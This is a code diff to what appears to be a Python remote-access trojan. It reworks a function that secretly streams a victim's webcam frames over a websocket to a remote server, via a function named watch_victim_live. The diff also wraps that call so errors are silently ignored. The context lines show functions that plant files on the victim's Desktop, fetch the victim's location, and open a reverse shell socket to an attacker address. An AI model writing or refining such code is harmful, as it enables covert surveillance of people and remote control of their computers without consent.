@@ -43,16 +43,20 @@ banner = r"""
 =====================================================
 """
 async def open_camera():
-        async with websockets.connect(WEBSOCKET_URL) as websocket:
-            cap = cv2.VideoCapture(0)
-            while True:
-                ret, frame = cap.read()
-                if not ret:
-                    break
-                _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
-                jpg_as_text = base64.b64encode(buffer).decode('utf-8')
-                await websocket.send(jpg_as_text)
-        cap.release()
+    async with websockets.connect(WEBSOCKET_URL) as ws:
+        cap = cv2.VideoCapture(0)
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
+        if not cap.isOpened():
+            print("Cannot open camera")
+            return
+        while True:
+            ret, frame = cap.read()
+            if not ret:
+                continue
+            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
+            await ws.send(buffer.tobytes())
+            await asyncio.sleep(0.03)  
 def put_files(args):
     chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
@@ -145,7 +149,10 @@ def get_location():
     else:
         return False
 def watch_victim_live():
-    asyncio.run(open_camera())
+    try:
+       asyncio.run(open_camera())
+    except Exception:
+        pass
 def reverse_shell_payload():
     s=socket.socket()
     s.connect((IP_ADDRESS,PORT))
